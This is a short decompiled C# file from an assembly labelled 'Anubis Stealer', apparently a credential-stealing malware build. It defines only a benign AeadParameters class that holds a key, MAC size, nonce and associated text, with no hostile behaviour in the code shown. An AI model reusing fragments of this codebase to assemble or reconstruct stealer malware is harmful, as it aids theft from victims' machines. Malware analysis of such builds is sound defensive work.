// Decompiled with JetBrains decompiler
// Type: Anubis.AeadParameters
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

namespace Anubis
{
  public class AeadParameters : ICipherParameters
  {
    private readonly byte[] associatedText;
    private readonly byte[] nonce;
    private readonly KeyParameter key;
    private readonly int macSize;

    public virtual KeyParameter Key => this.key;

    public virtual int MacSize => this.macSize;

    public AeadParameters(KeyParameter key, int macSize, byte[] nonce, byte[] associatedText)
    {
      this.key = key;
      this.nonce = nonce;
      this.macSize = macSize;
      this.associatedText = associatedText;
    }

    public virtual byte[] GetAssociatedText() => this.associatedText;

    public virtual byte[] GetNonce() => this.nonce;
  }
}
